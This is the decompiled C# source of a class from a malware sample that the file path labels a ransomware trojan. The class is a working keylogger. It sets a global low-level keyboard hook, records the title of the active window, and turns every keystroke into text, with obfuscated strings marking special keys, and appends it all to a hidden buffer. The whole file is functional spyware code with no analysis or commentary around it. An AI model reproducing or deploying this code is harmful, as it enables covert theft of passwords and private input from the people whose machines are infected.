// Decompiled with JetBrains decompiler
// Type: FLOUNLNG
// Assembly: new2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7D97D205-93EA-4722-A1E5-21E77DE843A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-30a4eb8393f203db2dc365b910e352cfc02ba6f80a0ccd316800296661747606.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class FLOUNLNG
{
  private string output;
  private static IntPtr WGXVL = (IntPtr) 0;
  private static string MTVKF = "";
  private static FLOUNLNG.KeyboardHookDelegate OGCWDQ = (FLOUNLNG.KeyboardHookDelegate) null;

  public static string URWWKD(IntPtr hWnd)
  {
    string str;
    try
    {
      if (hWnd.ToInt32() <= 0)
      {
        str = (string) null;
      }
      else
      {
        int windowTextLength = FLOUNLNG.GetWindowTextLength(hWnd);
        if (windowTextLength == 0)
        {
          str = (string) null;
        }
        else
        {
          StringBuilder lpString = new StringBuilder(checked (windowTextLength + 1));
          FLOUNLNG.GetWindowText((int) hWnd, lpString, lpString.Capacity);
          str = lpString.ToString().Trim();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static bool XURKBF()
  {
    bool flag;
    try
    {
      flag = FLOUNLNG.WGXVL != (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static void PMRWJIIE()
  {
    try
    {
      FLOUNLNG.OGCWDQ = new FLOUNLNG.KeyboardHookDelegate(FLOUNLNG.KYBRDLCK);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      FLOUNLNG.WGXVL = (IntPtr) FLOUNLNG.SetWindowsHookEx(13, FLOUNLNG.OGCWDQ, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void IKEPD()
  {
    try
    {
      if (!FLOUNLNG.XURKBF() || FLOUNLNG.UnhookWindowsHookEx((int) FLOUNLNG.WGXVL) == 0)
        return;
      FLOUNLNG.WGXVL = (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int UnhookWindowsHookEx(int hHook);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetAsyncKeyState(int vKey);

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SetWindowsHookEx(
    int idHook,
    FLOUNLNG.KeyboardHookDelegate lpfn,
    int hmod,
    int dwThreadId);

  public static int KYBRDLCK(int Code, int WPA, ref FLOUNLNG.ENKDHQ LPA)
  {
    try
    {
      string Left = FLOUNLNG.URWWKD(FLOUNLNG.GetForegroundWindow());
      if (Operators.CompareString(Left, FLOUNLNG.MTVKF, false) != 0)
      {
        FLOUNLNG.MTVKF = Left;
        CMFVPTX.GXDYQP = CMFVPTX.GXDYQP + Environment.NewLine + WOGVCL.TGKKNH("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + Left + WOGVCL.TGKKNH("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      string str = "";
      if (WPA == 256 | WPA == 260)
      {
        switch (LPA.VMFWJI)
        {
          case 8:
            CMFVPTX.GXDYQP = CMFVPTX.GXDYQP.Substring(0, checked (CMFVPTX.GXDYQP.Length - 1));
            break;
          case 9:
            str = char.ConvertFromUtf32(9);
            break;
          case 13:
            str = Environment.NewLine;
            break;
          case 20:
            str = !Control.IsKeyLocked(Keys.Capital) ? WOGVCL.TGKKNH("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : WOGVCL.TGKKNH("QpiLkJF1XZSehG1dl5WHf10m", "False");
            break;
          case 27:
            str = WOGVCL.TGKKNH("S6GWy62IZh0=", "False");
            break;
          case 32:
            str = WOGVCL.TGKKNH("RyA=", "False");
            break;
          case 35:
            str = WOGVCL.TGKKNH("R52SwqqEYiE=", "False");
            break;
          case 36:
            str = WOGVCL.TGKKNH("WrCo1safsoAP", "False");
            break;
          case 37:
            str = WOGVCL.TGKKNH("U6mVvXIT", "False");
            break;
          case 38:
            str = WOGVCL.TGKKNH("SJ6ssmce", "False");
            break;
          case 39:
            str = WOGVCL.TGKKNH("X7WjyX4H", "False");
            break;
          case 40:
            str = WOGVCL.TGKKNH("O5GXpVor", "False");
            break;
          case 46:
            str = WOGVCL.TGKKNH("WrCkzMWXdQ4=", "False");
            break;
          case 48:
          case 49:
          case 50:
          case 51:
          case 52:
          case 53:
          case 54:
          case 55:
          case 56:
          case 57:
            if (MyProject.Computer.Keyboard.ShiftKeyDown)
            {
              string[] strArray = WOGVCL.TGKKNH("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False").Split(Conversions.ToChar(WOGVCL.TGKKNH("VBM=", "False")));
              switch (LPA.VMFWJI)
              {
                case 48:
                  str = strArray[9];
                  break;
                case 49:
                  str = strArray[0];
                  break;
                case 50:
                  str = strArray[1];
                  break;
                case 51:
                  str = strArray[2];
                  break;
                case 52:
                  str = strArray[3];
                  break;
                case 53:
                  str = strArray[4];
                  break;
                case 54:
                  str = strArray[5];
                  break;
                case 55:
                  str = strArray[6];
                  break;
                case 56:
                  str = strArray[7];
                  break;
                case 57:
                  str = strArray[8];
                  break;
              }
            }
            else
            {
              str = char.ConvertFromUtf32(LPA.VMFWJI);
              break;
            }
            break;
          case 65:
          case 66:
          case 67:
          case 68:
          case 69:
          case 70:
          case 71:
          case 72:
          case 73:
          case 74:
          case 75:
          case 76:
          case 77:
          case 78:
          case 79:
          case 80:
          case 81:
          case 82:
          case 83:
          case 84:
          case 85:
          case 86:
          case 87:
          case 88:
          case 89:
          case 90:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? char.ConvertFromUtf32(checked (LPA.VMFWJI + 32)).ToLower() : char.ConvertFromUtf32(checked (LPA.VMFWJI + 32)).ToUpper();
            break;
          case 112:
          case 113:
          case 114:
          case 115:
          case 116:
          case 117:
          case 118:
          case 119:
          case 120:
          case 121:
          case 122:
          case 123:
          case 124:
          case 125:
          case 126:
          case (int) sbyte.MaxValue:
          case 128:
          case 129:
          case 130:
          case 131:
          case 132:
          case 133:
          case 134:
          case 135:
            str = WOGVCL.TGKKNH("UaedGA==", "False") + Conversions.ToString(checked (LPA.VMFWJI - 111)) + WOGVCL.TGKKNH("o4EC", "False");
            break;
          case 162:
          case 163:
            str = WOGVCL.TGKKNH("Vaue0cKpwsrOsVUS", "False");
            break;
          case 164:
          case 165:
            str = WOGVCL.TGKKNH("RJqLvbeBXyQ=", "False");
            break;
          case 186:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("cBI=", "False") : WOGVCL.TGKKNH("axY=", "False");
            break;
          case 187:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("WSs=", "False") : WOGVCL.TGKKNH("bAY=", "False");
            break;
          case 188:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("YhE=", "False") : WOGVCL.TGKKNH("XCc=", "False");
            break;
          case 189:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("cAQ=", "False") : WOGVCL.TGKKNH("eC4=", "False");
            break;
          case 190:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("ZRA=", "False") : WOGVCL.TGKKNH("bRg=", "False");
            break;
          case 191:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("aQ0=", "False") : WOGVCL.TGKKNH("gQU=", "False");
            break;
          case 192:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("lBM=", "False") : WOGVCL.TGKKNH("vQg=", "False");
            break;
          case 219:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("mgg=", "False") : WOGVCL.TGKKNH("wAI=", "False");
            break;
          case 220:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("czA=", "False") : WOGVCL.TGKKNH("vwQ=", "False");
            break;
          case 221:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("gSM=", "False") : WOGVCL.TGKKNH("rBg=", "False");
            break;
          case 222:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? WOGVCL.TGKKNH("bQE=", "False") : WOGVCL.TGKKNH("Ths=", "False");
            break;
          default:
            str = char.ConvertFromUtf32(LPA.VMFWJI);
            break;
        }
        CMFVPTX.GXDYQP += str;
        CMFVPTX.IKKVKS = CMFVPTX.GXDYQP;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    int num;
    return num;
  }

  [DllImport("user32.dll", SetLastError = true)]
  public static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern int GetWindowTextLength(IntPtr hwnd);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowText(int hwnd, StringBuilder lpString, int cch);

  public FLOUNLNG(string output)
  {
    try
    {
      this.output = output;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private delegate int KeyboardHookDelegate(int Code, int wParam, ref FLOUNLNG.ENKDHQ lParam);

  public struct ENKDHQ
  {
    public int VMFWJI;
    public int TGLGWP;
    public int JKVPXN;
    public int IVHHFJ;
    public int BSVHRK;
  }
}
